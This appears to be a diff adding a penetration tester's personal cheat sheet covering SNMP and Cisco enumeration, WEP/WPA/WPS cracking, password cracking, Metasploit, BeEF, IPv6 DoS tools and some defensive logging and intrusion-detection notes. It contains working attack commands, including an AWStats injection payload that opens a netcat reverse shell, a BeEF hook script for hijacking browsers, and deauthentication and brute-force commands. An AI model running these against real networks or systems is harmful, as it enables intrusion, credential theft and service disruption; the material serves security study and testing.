+				Determines if PHP will open or include files from 
+					remote servers	
+
+		setcookie (name, value, expire, path, domain);
+		setcookie ("username", "Kevin", Fri-27-Feb-2009", "/", "site.org");
+
+		Reading a cookie:
+			$username = $_COOKIE["username"];
+
+
+		PHP Code Sample to make a POST request:
+		   <?php
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, "http://sit.org/login.php");
+			curl_setopt($ch, CURLOPT_POST, 1);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, "name="Matt&pass=coolB3ans");
+			$resp = curl_exec ($ch);
+			curl_close ($ch);
+		   ?>
+
+	
+		PHP Code for mysql query:
+		     First Connect:	
+			$db = mysql_connect("localhost", "kevin", "mypasswd");
+		     Select the DB:
+			mysql_select_db("zombies", $db);
+		     Then execute the query:
+			mysql_query($sql);
+
+
+
+********************************************************************************************************
+SNMP
+********************************************************************************************************
+tkmib		- GUI tool for "walking the MIB"
+
+snmpwalk	- command line tool for "walking the MIB"
+
+ADMsnmp		- command line tool that conducts brute-force community string guessing on network
+		  devices that run SNMP
+			ADMsnmp 192.168.1.1 -wordfile /pentest/enumeration/snmp/admsnmp/snmp.passwd
+
+snmpbulkwalk	- command line tool that will cause DoS on older platforms
+		  snmpbulkwalk -C r240000 192.168.103.94
+
+snmpenumperl ./snmpenum.pl <ip> public linux.txtperl ./snmpenum.pl <ip> public windows.txtperl ./snmpenum.pl <ip> public cisco.txtsnmpchecksnmpcheck-1.8.pl -t <ip>OneSixtyOneonesixtyone -c ./dict.txt <ip>MetasploitUse Auxiliary SNMP modules (snmp_enum, snmp_login)
+********************************************************************************************************
+Cisco Devices
+********************************************************************************************************
+
+Cisco Torch	- A perl script that is capable of identifying services running on Cisco devices, such
+		  as SSH, telnet, HTTP, TFTP, NTP and SNMP.  It can conduct brute-force password 
+		  attacks and even download the configuration file if the read/write community string
+		  is found.
+		/pentest/cisco/cisco-torch-0.4b/cisco-torch.pl -A 192.168.1.1
+			-A              All fingerprint scan types combined
+			-t              Cisco Telnetd scan
+			-s              Cisco SSHd scan
+			-u              Cisco SNMP scan
+			-g              Cisco config or tftp file download
+			-n              NTP fingerprinting scan
+			-j              TFTP fingerprinting scan
+			-w              Cisco Webserver scan
+			-z              Cisco IOS HTTP Authorization Vulnerability Scan
+			-c              Cisco Webserver with SSL support scan
+			-b              Password dictionary attack (use with -s, -u, -c, -w , -j or -t only)
+					brutefile.txt, community.txt, password.txt and users.txt all in dir
+			-V              Print tool version and exit		
+
+finger		-If the finger service is running on a cisco router, it is possible to query the service 
+		 to determine who is logged onto the device.
+		 	finger -l @192.168.1.1
+				Line	User	Host(s)		idle		Location
+				2 vty0	jimmy	idle		00:00:11	192.168.1.100
+
+
+
+
+********************************************************************************************************
+Wireless 802.11x	
+********************************************************************************************************
+GPS Receiver	GlobalSat BU-353	aprox $37.00
+
+tcpdump
+	put interface into monitor mode and start stiffing:
+		ifconfig [interface] down
+		iwconfig [interface] mode monitor channel [N]
+		ifconfig [interface] up
+		tcpdump -i [interface]
+
+WEP
+	use tcpdump to capture wireless traffic
+	tcpdump -rnn output.cap |grep "Beacon"
+	aircrack-ng -e "<essid captured>" output.cap
+		or
+	CoWPAtty below
+
+WPA
+	use tcpdump to capture wireless traffic: tcpdump -w output.cap
+	tcpdump -rnn output.cap |grep "Beacon"
+	./cowpatty -r output.cap -s "<essid>" -f ./dictionary.lst
+		or
+	./aircrack-ng -w ./dictionary.lst -e "<essid>" ./output.cap
+
+
+Netdisco 	tool for automating information gathering, network mapping, and
+		MAC lookup.  http://www.netdisco.org
+		Uses SNMP and CDP (Cisco Discovery Protocol) to pull info from
+			routers and switches
+
+Wireless capable sniffers:	TCPDump, Kismet, Wireshark
+
+wlan2eth	tool that converts captured wireless frames to lipcap format 
+		for use in Ethernet-centric packet capture analysis tools
+
+VistaRFMon	tool to put Windows Vista (no XP, or 7) wireless interface into
+		monitor mode.  Can be used with Microsoft NetMon to grab 
+		packets...then convert to libpcap format with nm2lp tool
+		www.inguardians.com/tools
+
+Linux - put interface into monitor mode and start stiffing:
+	iwconfig [interface] mode monitor channel [N]
+	tcpdump -i [interface]
+
+
+kismet		Wireless discovery tool:
+	Configuring-
+	In a typical Linux install, the Kismet configuration files are found in /etc/kismet. Depending 
+	on your platform or distribution, this location may vary. 
+	Edit the primary configuration file, kismet.conf.
+	Inside, you will find the line:
+	
+		suiduser=your_username_here  (typically root, new version wants normal user
+						and that user must be in the kismet group)
+						(may need to add this to the kismet_drone.conf as well)
+
+	You also need to tell Kismet which 'source,' or wireless adapter, to use. The basic syntax used 
+	in kismet.conf is:
+
+		source=type,interface,name	
+
+	On my Backtrack system with an Intel Corporation PRO/Wireless 2200BG Network, my source 
+	configuration looks like this:
+	
+		source=ipw2200,eth1,Intel		#for my dell laptop with intel chipset
+
+	Some alternative source lines for other cards include:
+		source=rt73,wlan0,ralink		#for my dlink usbdongle
+		source=bcm43xx,wlan0,broadcom		#for my dell laptop with broadcom chipset
+		source=iwl4965,wlan0,Intel		#for my HP work laptop on fedora
+		source=madwifi_b,ath0,madwifi
+		source=orinco,eth1,Orinoco
+		source=prism,wlan0,hostap
+		source=viha,en1,AirPort
+
+	You may have to modify the logging directory in the kismet.conf file
+
+	Where do these parameters come from? The Kismet documentation contains a section called 
+	'Capture Sources,' which includes a chart that lists the type and interface parameters for every 
+	supported chipset. The third parameter, name, can be set to anything you like for logging purposes.
+
+	Running Kismet
+	Unless you install a window-based GUI for Kismet such as KisMAC or GKismet, this is a text-based 
+	application. On my Linux system, I open a terminal window and launch Kismet as root:
+
+		sudo kismet				#use this from your normal user account
+	 
+	Kismet shows the list of detected wireless networks. They are initially sorted in 'Autofit' mode, 
+	which does not present the networks in a specific order. Press 's' to bring up the sort menu, where 
+	you can order the SSID's by name, chronology, and other criteria.
+ 
+	You can press 'h' in Kismet to pop a chart of key commands. 
+	Press "s" for sort options and gathering info about AP's detected.  Select a sort type.
+	With the network names sorted, you can use the up/down arrow keys to navigate through the list. 
+		Press 'i' on a network to see a detailed view of that particular network.
+		Press 'c' to see what clients are authenticated to the network
+ 
+	Press the 'l' key in Kismet to pop up signal strength data. 
+	Press the 'r' key for a packet rate graph 
+
+	The wireless card power window is especially useful in troubleshooting wireless connections for 
+	source of noise, or optimizing locations of access points for maximizing signal strength within a 
+	space.
+
+	Keys in Kismet
+		s	sorts discovered networks
+		p	packet details
+		a	statistics about channel usage
+
+	IDS - Kismet signatures include:
+		Netstumbler probe requests
+		Probe-no-join
+		channel change - possible sign of man-in-the middle attack
+		Deauth flood
+		Broadcast disassociate or deauthenticate
+
+
+Aircrack	Used to crack WEP keys
+
+	Wireless cards known to work:
+		http://backtrack.offensive-security.com/index.php/HCL:Wireless
+
+	These instructions were tested using broadcom wireless card in Ubuntu
+
+	apt-get install libnl-dev
+
+	wget http://wireless.kernel.org/download/iw/iw-0.9.21.tar.bz2
+	bzip2 -d iw-0.9.13.tar.bz2
+	tar -xvf iw-0.0.13.tar
+	cd iw-0.9.21
+	make 
+	make install
+
+	Instructions for cracking WEP:
+
+	airmon-ng start wlan0
+
+	kismet -do not run at the same time as aircrack tools.
+
+	Locate the wireless network you want to crack and note the ESSID, BSSID and
+	Channel
+
+	airodump-ng -c <channel> --bssid <AP MAC> -w dump wlan0
+
+		This allows us to watch the amount of data packets going to and from the
+		access point.  We want between 400,000 and 1,000,000 packets to crack
+		successfully
+
+	sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID i.e AP MAC> wlan0
+		#sudo aireplay-ng -1 0 -h <MAC addr to spoof> -e <ESSID> -a <BSSID i.e AP MAC> wlan0
+
+		You should see "Association successful :-)"
+
+	Now, Start injecting packets:
+
+	aireplay-ng -3 -b  <BSSID AP MAC> wlan0
+
+		At first, it will only read packets, and say 0 ARP requests and 0 packets sent.
+		Just wait a minute or two and it will start sending packets in large quantities.
+		If it returns text that says it has been deauthorized, press Ctrl+C and run the 
+		command again. You can try to speed things up by entering this command:
+
+		    sudo aireplay -0 1 wlan0 -a <BSSID> 
+
+	aircrack-ng -z dump*.cap
+	
+		After a minute or so the WEP key should be returned.  Depending on the 
+		number of packets that have been gathered, this may take some time.  The
+		-z argument tells aircrack-ng to try a ptw attack also...if the version of 
+		aircrack-ng supports it.  
+
+		NOTE:  aircrack-ng can run concurrently with airodump-ng.  This will allow
+		you to check the number of IVs that airodump-ng has gathered.  
+
+	aireplay-ng -9 wlan0  -basic test to see if your wireless card supports injection
+		wlan0 channel:9
+		Trying broadcase probe requests...
+		injection is working!
+		Found 2 APs
+		Trying directed probe requests...
+		00:09:5B:5C:CD:2A - channel: 11 - 'NETGEAR'
+		0/30: 0%
+		00:14:6C:5C:CA:3B - channel: 6 - 'ACTIONTEC'
+		Ping (min/avg/max): 2.763ms/4.190ms/8.159ms
+		27/30: 90%
+	   90% for 'ACTIONTEC': This is the only AP that the card can successfully communicate 
+	   with.  This is another verification that your card can inject.  All other AP's have 0%
+
+
+	Instructions for cracking WPA/WPA2:
+	airmon-ng start wlan0
+		Put network card in monitor mode
+
+	airodump-ng -c 9 --bssid <bssid> -w psk wlan0
+		Using airodump-ng you must capture the 4-way authentication handshake for the AP
+		-c 9 			channel
+		--bssid <bssid>		Access Point MAC address
+		-w ask 			is the file name prefix for the file which will contain the IVs
+		wlan0			interface name
+
+		When you successfully capture the 4-way handshake you will see:
+			CH  9 ][ Elapsed: 10 min ][ 2009-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80
+				If you don't see 'WPA handshake:' on the top line you don't have handshake
+
+	aireplay-ng -0 1 -a <bssid> -c <MAC Addr of client> wlan0
+		If you don't capture a 4-way handshake you can deauth a client and make them perform the 
+		4-way handshake again.  Doesn't always work in my experience 
+		-0			deauthentication
+		1			number of deaths to send
+		-a <bssid>		Access Point MAC address
+		-c <MAC Addr of client>	MAC address of client you are deauthing
+		wlan0			interface
+ 
+	aircrack-gn -w password.lst -b <bssid> psk*.cap
+		This will attempt to brute force crack the password for the AP
+		-w 			name of dictionary file to use
+		-b			Access Point MAC address
+		*.cap			name of group of files containing the captured packets
+
+
+
+CoWPAtty	performs offline dictionary attacks against WPA-PSK networks.  Capture must contain the
+		four way handshake of WPA authentication.  Void11 can be used to force clients to 
+		deauthenticate from a network and reauthenticate which can then be captured.
+	cowpatty -f /usr/share/pico/cowpatty/final-wordlist.txt -r ./Kismet-Aug-17-2008.dump -s ACTIONTEC
+		-f path to Dictionary file
+		-r Packet Capture (use the packet capture (kismet.dump file) from Kismet)
+		-s SSID (enclose in quotes if it contains spaces)
+
+		or
+		WPA pre-shared key cracking 
+		use tcpdump to capture wireless traffic
+
+
+Reaver		can be used to brute force attack Wifi Protected Setup (WPS) registrar PINs on several 
+		different Access Points (AP) in order to recover WPA/WPA2 passphrases.  Typically takes
+		4-10 hours to crack and sometimes longer.
+		root@bt~/reaver-1.3/src# airmon-ng start wlan0
+		root@bt:~/reaver-1.3/src# ./wash -i mon0 -C -s		#used to be walsh?
+		      Scanning for supported APs...
+		
+		      00:24:7B:AD:A6:87 bbb1012
+		      00:1D:6A:BA:06:71 TSD-AirLink
+		      40:4A:03:DF:34:43 myqwest3373
+		      ^C
+		root@bt:~/reaver-1.3/src# ./reaver -i mon0 -b 00:24:7B:AD:A6:87
+		      Reaver v1.3 WiFi Protected Setup Attack Tool
+		      Copyright (c) 2011, Tactical Network Solutions, Craig Heffner
+
+		      [+] Waiting for beacon from 00:24:7B:AD:A6:87
+		      [+] Associated with 00:24:7B:AD:A6:87 (ESSID: bbb1012)
+		      [+] 0.01% complete @ 2012-01-10 11:32:51 (0 seconds/attempt)
+		      [+] Key cracked in 8 hours 23 seconds
+		      [+] WPS PIN: '64435562'
+		      [+] WPA PSK: 'S3cr3tP@$$k3y'
+		      [+] AP SSID: 'bbb1012'
+
+
+
+
+Wireless Client attacks
+	AirJack	suite	-Hijacking Wireless Sessions
+			WLAN-jack 	DoS - send deauthentication frames
+					repeatedly, knocking all off of AP
+			ESSID-jack	Get ESSID info ina  cloaked and 
+					low-traffic network
+			Monkey-jack	Monkey-in-the-middle attack for
+					wireless hijacking
+
+	Karma (Karmetasploit)	-will pretend to be anything a client requests
+			Automatically acts as ANY requested AP then provides:
+			DHCP, DNS, HTTP, SMB, POP3 and FTP
+			Integrated into Metasploit!!
+
+
+********************************************************************************************************
+Exploits, bruteforce, etc.
+********************************************************************************************************
+
+Site for cracking password hashes up to 14 characters instantly:
+	https://www.objectif-securite.ch/en/products.php
+
+Example Password = ApPLe
+LANMAN Hash	 = APPLE
+lm2ntcrack	 - input clear text LANMAN (all caps) password and the 
+		   ciphertext NT hash
+		   Included in metasploit
+		   http://www.xmcopartners.com/lm2ntcrack
+
+
+Linux Account Lockout:
+	/usr/share/doc/pam-[version]/txts/README.pam_tally
+
+	grep tally /etc/pam.d/*
+	grep tally /etc/pam.conf
+	
+	To reset an account in linux, /var/log/faillog is where it is stored:
+		faillog -r -u [login_name]
+
+
+Live CD linux Distro to reset administrator account on Windows
+http://home.eunet.no/~pnordahl/ntpasswd/	
+	Be careful - you will lose access to EFS keys for that account
+
+
+Create a custom dictionary from a website
+	mkdir /tmp/source
+	cd /tmp/source
+	wget -r -l 5 [target_website]
+	cd ..
+	grep -h -r "" source |tr '[:space:]' '\n' |sort |uniq > wordlist.txt
+		The [] around :space: should be in the command
+		source is the directory created above
+	grep -v '<' wordlist.txt > newlist.txt
+
+
+BED - Bruteforce Exploit Detector - this takes several hours.
+	bed.pl -s <plugin> -t <target> -p <port>
+		-s 	FTP/SMTP/POP/HTTP/IRC/IMAP/PJL/LDP/FINGER/SOCKS4/SOCKS5
+		-t	IP addr
+		-p	port
+	/pentest/fuzzers/bed/bed.pl -s HTTP -t 10.1.1.1
+
+Metasploit	-See my dedicated Metasploit Doc!
+    Basic Syntax:	
+	show exploits
+	info <exploit name>
+	use <exploit name>
+	show PAYLOADS
+	set PAYLOAD <payload>
+	show options
+	set <options that are required>
+	exploit
+
+    Show existing sessions:
+	sessions -l    #list sessions
+	sessions -i 1  #pick session to connect to
+	sessions -l -v #list all sessions and what exploit was successful
+
+    Set Metasploit to ask as web server for "OWNING" a victim browser
+	use auxiliary/server/browser_autopwn
+	set LHOST 192.168.1.100
+	set SRVPORT 80
+	set URIPATH notevil
+	exploit
+		Now visit http://192.168.1.100/notevil
+
+
+    Autopwn
+	autopwn for metasploit will take output from nessus and use it in metasploit to exploit vulnerabilities
+	Nessus -> Metasploit:
+	http://gentoo-wiki.com/Metasploit
+	http://blog.metasploit.com/2006/09/metasploit-30-automated-exploitation.html
+
+    fast-track - automate setting up the autopwn process - has gui or console mode
+	fast-track.py run first...
+	    inside metasploit:
+		load db_sqlite3
+		db_create pentest
+		db_nmap 192.168.1.1-255 -p1-65535
+		db_autopwn -p -t -e
+
+    Metasploit 3 scanning modules
+	scanning mixins/modules
+
+    Redirect HTTP requests to "intranet"
+    Return HTML page with UNC link
+       	IE 5/6/7 <img src="\\ip\share\i.jpg">
+	Firefox  mozicon-url:file:///ip/share/i.jp
+
+Saint	-10 user license with BackTrack - Vulnerability Assessment and automated Pen Tester
+
+Linux password storage /etc/shadow
+	$1$	MD5
+	_	BSDi Extended Des
+	$2$	Blowfish-based
+	$2a$	Blowfish-based
+	$5$	SHA-256
+	$6$	SHA-512
+
+
+hydra	-Brute force login for multiple daemons
+	hydra -l <login name> -P <password file> -e ns -t 8 192.168.1.110 ssh2
+		-l	login name of user account you want to brute force
+		-P	location and name of password dictionary file
+		-e ns	checks for null password and login name as password
+		-t 8	run number of tasks in parallel - higher than 8 seems to error
+		ssh2	service to attack.  Others: telnet, ftp, pop3, imap, smb, smbnt, http, cisco,
+			cisco-enable, vnc, ldap2, ldap3, mssql, mysql, oracle-listener, postgres,
+			nntp, socks5, rexec, rlogin, pcnfs, snmp, rsh, cvs, icq, sapr3, ssh2, 
+			smtp-auth, pcanywhere, teamspeak, sip, vmauthd
+	pw-inspector		#parses a password list file to meet your criteria
+		-i:	input file
+		-o:	output file
+		-m [n]:	minimum password length
+		-M [N]:	Maximum password length
+		-c [count]:	Minimum number of criteria required in each
+				password 
+		Criteria:
+		-l:	lower case	-u:	upper case
+		-n:	numbers		-p:	printable chars not in l u or n
+		-s:	special chars
+
+	cat pwlist.txt | pw-inspector -m 6 -n -u -l -c 2
+		passwords that are:
+			-m 6	minimum of 6 characters
+			-n 	contains numbers
+			-l	lower case
+			-u	upper case
+			-c 2	contains 2 of the 3 criteria listed
+
+
+John the Ripper	- a fast password cracker.
+	john <password file i.e. shadow, sam>
+	To restrict John to a wordlist only but permitting the use of word mangling rules:
+		john --wordlist=<dictionary file> --rules <password file i.e. shadow, sam>
+
+	http://www.openwall.com/john
+	stores cracked passwords in john.pot file
+	./john --show [password_file]
+	john.rec file - allows you to continue where you left off if you stop
+	./john --test	check speed of system
+	john --session=[name]	allows you to distribute john to other cores
+				set minlen/max length differently on each core
+	./john --format=nt /tmp/sam.txt		will focus on NT hashes
+	
+	./unshadow /etc/passwd /etc/shadow > combined.txt
+		combines the passwd & shadow files into 1 file for cracking
+	./john combined.txt
+
+	Compile John with sse2 and NT Hash support…not just LANMAN
+		mkdir /tmp/john-1.7.2.orig
+		download and extract john to /tmp/john-1.7.2.orig
+		download john-1.7.2-ntlm-alainesp-6.1.diff.gz to /tmp
+		gunzip /tmp/john-1.7.2-ntlm-alainesp-6.1.diff.gz
+		cd /tmp
+		patch -p0 < john-1.7.2-ntlm-alainesp-6.1.diff
+		cd /tmp/john-1.7.2.orig/src
+		make
+		make clean
+		make linux-x86-sse2
+		cd ../run
+		./john --test
+
+	Compile John from source with the Jumbo patch for 64 bit sse2 support and all add-ons like NT Hash, etc
+		sudo apt-get install libssl-dev
+		wget http://www.openwall.com/john/g/john-1.7.5.tar.gz
+		wget http://www.openwall.com/john/contrib/john-1.7.5-jumbo-2.diff.gz
+		tar -xzvf john-1.7.5.tar.gz
+		gzip -d john-1.7.5-jumbo-2.diff.gz
+		patch -p0 < john-1.7.5-jumbo-2.diff
+		cd john-1.7.5/src
+		make		#this will show you what architecture to type in next line
+		make clean linux-x86-64
+		cd ../run
+		./john --test
+		./john ….
+
+
+Cryptcracker
+	http://blog.hacker.dk/2010/04/cracking-sha-256-and-sha-512-linuxunix-passwords/?reffed=1
+	Crack Sha256 and Sha512 passwords that John the Ripper can't
+	cat password.list |./cryptcrack.pl -f shadow 
+		-o output_file.txt 	if you want to output to file.
+
+	$ cat password.lst |./cryptcrack.pl -f shadow -o my_found_passwords
+	Read 1 hashes from file
+	Spawning 4 threads
+	90.911 keys per second.
+	92.251 keys per second.
+	92.111 keys per second.
+	92.401 keys per second.
+	88.791 keys per second.
+	FOUND: jamesdick ($6$/2CahJnQ$4cl6vYMRg/ytkZsfBDrBEORmneK45hqDC77KAdkW/NgPumKHwL04SXUequNzktFSEwHcdpLOF.gOSHfLyJvlo.)
+
+	Cracked passwords:
+	—————
+	jamesdick ($6$/2CahJnQ$4cl6vYMRg/ytkZsfBDrBEORmneK45hqDC77KAdkW/NgPumKHwL04SXUequNzktFSEwHcdpLOF.gOSHfLyJvlo.) 
+
+
+GPU for password cracking - cuda api for Nvidia graphics cards, on backtrack?
+
+
+Rainbow tables:
+	Site for cracking password hashes up to 14 characters instantly:
+		https://www.objectif-securite.ch/en/products.php
+	www.freerainbowtables.com
+	rainbowtables.shmoo.com
+	lasecwww.epfl.ch/~oechslin/project/ophcrack
+	www.astalavista.net/?cmd=ranbowtables  -enter hash...get passwd on site
+
+Tools for rainbow table lookups:
+	sourceforge.net/projects/ophcrack
+	project-rainbowcrack.com
+	
+
+Ophcrack
+	boot to Live CD.
+	If on a Windows box it will try to load sam automatically
+	If you are running ophcrack on a different computer...
+		run 'ophcrack' from the xterm session
+		load the pwdump file and tables
+
+
+Pass the Hash toolkit
+	oss.coresecurity.com/projects/pshtoolkit.htm]
+	whosthere.exe	dumps current user session information
+	genhash.exe	Generates LANMAN and NT hash
+	iam.exe		Changes existing hashes in memory to chosen value
+
+
+Metasploit psexec exploit - Pass the hash attack
+
+
+pentestmonkey.net - Has tool for php reverse shell as well as other tools
+	http://pentestmonkey.net/tools/php-reverse-shell/
+pastie.org - site that contains injectable exploits that can be pulled down
+	during an attack
+
+AWSTATS
+	Google - inurl:awstats
+		 intitle:"statistics for"
+	Try appending the following to the URL:
+		?&PluginMode=:print+system(`id')+;
+			or
+		?&PluginMode=:print+systme('top -b -n1')+;
+			or
+		have a nc listener running "nc -l -p 3000"
+		?&PluginMode=:print+system('nc+<ip of nc>+3000+-e+/bin/sh')+;
+			run ls -l in nc listener
+
+PHPShell	a web based Shell
+		http://phpshell.sourceforge.net
+		made up of two files- phpshell.php and config.php
+
+AJAXShell	another web based shell using AJAX
+
+BeEF		Browser Framework for building attacks.
+		http://www.bindshell.net/
+		Zombie Control	
+		beefmagic.js.php file is the file that will all you to make a 
+			visiting computer the zombie
+			Add the following to an existing web page:
+				<script language='Javascript' src='/beef/hook/beefmagic.js.php'></script> 	
+		Modules available:
+			Autorun - alert box or deface content on a page
+			Clipboard Stealing - IE 7 or older
+			JavaScript Injection - running of further code 
+			Request Initiation - CSRF attacks!
+			History Browsing - Retrieves browser history
+			Port Scanning - Port scanning
+			Browser Exploits - runs calc.exe on victim machine
+			Inter-Protocol Exploitation - Submits malicious payloads
+				inject a BindShell, etc
+
+
+Fuzzers:
+	bed
+	bf2
+	bunny
+	jbrofuzz
+	peach
+	spike
+	voiper
+	wsfuzzer
+
+Local fuzzers - commonly used to test privilege escalation on linux systems:
+	clfuzz by warl0ck
+	iFUZZ by Adam Greene
+	Sharefuzz by Dave Aitel
+
+Fie Format Fuzzers - Dynamically creaets different malformed files that are then launched using the 
+	target application.
+	FileFuzz by Michale Sutton
+	SPIKEfile by Adam Greene
+	PAIMEIfilefuzz by Cody Pierce
+
+Remote Fuzzers - Target software that listens on a network interface
+	SPIKE by Dave Aitel
+	Peach by Michael Eddington
+
+Web Application Fuzzers - Looks for vulnerabilities unique to web applications such as SQL injection,
+	Cross Site Scripting, etc
+	WebScarab by OWASP
+	SPI Fuzzer by SPI Dynamics
+	Codenomicon HTTP Test Tools by Codenomicon
+
+
+********************************************************************************************************
+Encryption
+********************************************************************************************************
+gnupg
+	gpg -c --cipher-algo AES256 <file to crypt>
+	gpg -d <file to decrypt>
+
+		sudo port install gnupg
+
+openssl
+	Encrypt:
+	   openssl enc -aes-256-cbs -salt -in ./<file to crypt> -out <crypted file> -pass file:/<pw>
+	Decrypt:
+	   openssl enc -d -aes-256-cbc -in ./<crypted file> -out <decrytped file> -pass file:/<pw file>
+
+
+
+********************************************************************************************************
+IPv6
+********************************************************************************************************
+THC Toolkit	-> http://www.thc.org/thc-ipv6/
+	alive6		Will detect all systems listening to this address
+			alive6 eth0
+
+	flood_router6	DoS IPv6 networks via IPv6 router advertisements
+			flood_router6 eth0
+
+	denial6		a collection of denial-of-service tests against a target
+			denial6
+
+	detect-new-ip6	Detect new ip6 devices which join the network, you can run a script to 
+			automatically scan these systems etc.
+
+Metasploit
+	Send ICMP request to the IPv6 multicast addresses and discover existing systems running IPv6:
+		use auxiliary/scanner/discovery/ipv6_multicast_ping
+		run
+
+	Use the ARP protocol to discover active IPv4 addresses and then identifies corresponding IPv6 
+	addresses for the systems.
+		use auxiliary/scanner/discovery/ipv6_neighbor
+		set RHOSTS 10.180.195.0/24
+		run
+
+	IPv6 Port Scanner:
+		user auxiliary/scanner/portscan/tcp
+		set RHOSTS fe80::221:9bff:fe95:295e	
+		set PORTS "7,21,22,23,25" or "1-65535"
+		set THREADS 50
+		run
+
+
+
+********************************************************************************************************
+Some Counter Measures
+********************************************************************************************************
+
+
+Address Allocation is documented.  Block unused and unassigned IP's:
+	http://www.iana.org/assignments/ipv4-address-space
+
+Countries in attack mode:
+	www.completewhois.com/statistics/data/ips-bycountry/rirstats/
+	www.ip2location.com
+
+Known bad guys
+	dshield.org	-Top 10 IP's
+
+Robots Exclusion Protocol (robots.txt)	http://www.robotstxt.org
+
+iptables		iptables -L -nxv	#tuning for performance
+
+Snort			-pass rule is processed after the alert rule.  Use the "-o" option to
+			 have the pass rule process first.  Use it to pass alerts from VAM
+
+iptraf -d eth0 -B -L /var/log/internetf-traffic.txt
+
+
+OSSEC		-Open Source host based intrusion detection system
+		 Supports Windows, Mac Linux, BSD, Solaris, AIX & HP-UX
+		  -centralized logging
+		  -Web Interface	
+		www.ossec.net
+		www.stearns.org/fanout
+
+ 	OSSEC is an open source, host-based intrusion detection system. It is cross-platform, so it will 
+	work on Windows, Linux, and Mac OS X, and it also can employ a client/server architecture that 
+	allows you to have one central OSSEC server with a number of monitored OSSEC clients. It provides 
+	intrusion detection techniques such as log analysis, rootkit detection, file integrity checking, 
+	active response to identified threats, real-time alerting and, for Windows client systems, 
+	registry monitoring.
+	OSSEC may not be the only tool you ever need, but it does consolidate a number of disparate tools 
+	into one and, with the client/server model, it allows for consistent monitoring of multiple 
+	systems which makes it great for office environments or server farms.
+	The OSSEC site offers three downloads: the binary client agent for Windows, the OSSEC Web 
+	interface, and the source for Unix/Linux systems. Some distributions may provide a binary package 
+	for OSSEC, but if they do, ensure it is the latest version. As of this writing, the current 
+	version is 1.6.1.
+	To begin with, download the source for Linux: ossec-hids-1.6.1.tar.gz. It is also a good idea to 
+	download the checksum file as well to verify the validity of the file.
+
+		# curl -OL http://www.ossec.net/files/ossec-hids-1.6.1.tar.gz
+		# curl -OL http://www.ossec.net/files/ossec-hids-1.6.1_checksum.txt
+		# md5sum -c ossec-hids-1.6.1_checksum.txt
+		# tar xvzf ossec-hids-1.6.1.tar.gz
+		# cd ossec-hids-1.6.1
+		# ./install.sh
+
+	The above will use curl to download the tarball and checksum file; verify the checksum. If the 
+	file verifies okay (ignore failures for non-existent files), unpack it, and execute the install.sh 
+	script.
+	Keep in mind that on Linux you can do a server, agent, or local install. Under the assumption that 
+	we only want to monitor the server itself, choose the local install. You must also have gcc 
+	installed as the installation will compile the program after asking some questions such as what 
+	type of installation, where the files will be located, who to send e-mail to, what options to 
+	enable, and so forth. In most cases, the defaults will suffice.
+	When it comes to the active response questions, the best bet is to take advantage of OSSEC’s 
+	ability to add firewall rules to drop potential intruders, rather than using /etc/hosts.deny, which 
+	is not nearly as comprehensive; using hosts.deny will only impact services compiled with tcpwrappers 
+	support.
+	Once you have answered the small number of questions, the program will compile. When it is done, you 
+	can start OSSEC immediately. By default, the configuration file will be /var/ossec/etc/ossec.conf, 
+	and the service itself can be started via the /var/ossec/bin/ossec-control script. Depending on the 
+	platform being installed to, you may be asked to manually place OSSEC to start, or it will create an 
+	init script to start and stop the service automatically.
+	The configuration file itself is an XML file, which makes it fairly straightforward to edit. This is 
+	where additional log files to be examined would be configured. The OSSEC wiki covers the configuration 
+	file in more detail.
+	Finally, to begin using OSSEC, execute:
+
+		# /var/ossec/bin/ossec-control start
+
+	For a local configuration, this is all that is required. Further configuration via the ossec.conf file 
+	may be desired to further protect the system by specifying additional directives. Installing the web UI 
+	may help in this regard, and allow you to see what is going on with the system. The web interface is 
+	still in early development, so some functionality is missing, but it may yet prove useful and worthwhile 
+	to install and check out.
+
+
+SEEdit	Graphical frontend for SELinux
+		seedit.sourceforge.net
+
+SARA		Vulnerability Scanning tool similar to Nessus
+	
+
+Forensic policy:
+		http://www.sans.org/rr/whitepapers/incidents/
+
+ProxyHunter	Used to find anonymous proxies
+
+arpwatch	tracks Ethernet and IP address pairs.  Will let you know if a new MAC
+		shows up.  Plus, it detects arp poisoning.
+
+OS Lockdown help
+	http://csrc.nist.gov/itsec/guidance_WinXP.html
+	http://www.cisecurity.org/
+	http://www.cisecurity.org/bench_windows.html
+	http://www.bastille-unix.org
+
+
+
+*********************
+Logs and Log Parsing
+*********************
+Resources for prunning log files:	
+	www.dshield.org
+	www.neohapsis.com/neolabs/neo-ports/
+	www.securityfocus.com
+
+	Posts:
+		list@lists.dshield.org
+		incidents@securityfocus.com
+		loganalysis@loganalysis.org
+
+
+firewall logs	-parse out interesting information:
+	grep " R " firewall.log > resets.txt
+	grep "10.18.0.1.80[: ]" firewall.log > web_traffic.txt
+	grep -v "10.18.0.1.80[: ]" firewall.log > trace1.txt
+	grep upd trace1.txt |grep "\.53[: ]" > dns_udp.txt
+	grep tcp trace1.txt |grep "\.53[: ]" > dns_tcp.txt
+	grep -v "\.53[: ]" trace1.txt > trace2.txt
+	grep "192.168.253.19.8082[: ]" trace2.txt > bluecoat.txt
+	grep -v "192.168.253.19.8082[: ]" trace2.txt > trace3.txt
+	grep -v " R " trace3 > trace4.txt
+	rename trace4.txt interesting_stuff.txt
+	rm -rf trace*.txt
+
+Windows to syslog:
+	http://www.loganalysis.org/sections/syslog/windows-to-syslog/index.html
+	http://sourceforge.net/projects/snare
+		Windows Events you want to log:
+			531 = Attempt to logon to a disabled account
+			534 = Logon type not permitted
+			608 = User rights assignments
+			624 = Account creation
+			626 = Existing account enabled
+			632/633/636/637/660/661 = User added/deleted from group
+			642 = Changes to existing account
+
+Logger 	- permits you to transmit information to the local syslog process
+		  and have it recorded as a log entry
+		nmap -sT -P0 192.168.1.1 |logger -p13
+		logger -p 0 "All your base are belong to us!"
+		logger -p 20 -f ~/somefile.log
+
+logrotate.conf
+		#rotate log files daily
+		daily
+
+		#keep 2 months worht of backlogs
+		rotate 60
+		
+		#create new (empty log files after rotating old ones
+		create
+		
+		#uncomment this if you want your log files compressed
+		#compress
+
+		#RPM packages drop log rotation information into this directory
+		include /etc/logrotate.d
+
+
+Logwatch	-Log parsing tool
+		http://www.logwatch.org
+			Reports everything, not just matched patterns
+			Summary format
+			Matched patterns are used to organize and sort data
+			Flexible reporting options
+				write to a file
+				e-mail to a user
+
+		Useful switches:
